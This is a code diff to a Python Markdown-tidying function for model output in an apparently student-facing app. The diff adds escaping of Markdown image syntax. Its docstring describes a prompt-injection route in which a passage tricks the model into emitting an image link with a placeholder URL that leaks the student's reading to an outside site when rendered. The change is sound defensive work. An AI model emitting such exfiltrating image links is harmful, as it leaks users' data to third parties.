@@ -70,16 +70,23 @@ _INLINE_MATH = re.compile(r"\\\((.+?)\\\)", re.DOTALL)  # \( ... \)
 
 
 def tidy_markdown(text: str) -> str:
-    """Normalize model output so it renders and its citations can be checked.
+    """Normalize model output so it renders safely and its citations can be checked.
 
     Models differ in formatting: some cite as 【S2】 and write math between \\( \\) or \\[ \\],
     which Markdown renderers that expect $...$ show as raw text.
+
+    Images are shown as plain text. A browser loads an image as soon as it renders, so a
+    passage that tricks the model into writing ![](https://site/?q=...) could send what the
+    student is reading to that site without a click. Every Markdown image, inline or
+    reference style, starts with "![". This runs last, since the steps before it can make
+    one (a "!" followed by 【S1】 becomes "![S1]").
     """
     text = _FULLWIDTH_CITATION.sub(r"[\1]", text)
     # Formulas are kept on one line: a line break inside a Markdown table cell would end the
     # table row and break the rest of the answer.
     text = _DISPLAY_MATH.sub(lambda m: f"$${_one_line(m.group(1))}$$", text)
-    return _INLINE_MATH.sub(lambda m: f"${_one_line(m.group(1))}$", text)
+    text = _INLINE_MATH.sub(lambda m: f"${_one_line(m.group(1))}$", text)
+    return text.replace("![", "!\\[")
 
 
 def _one_line(math: str) -> str:
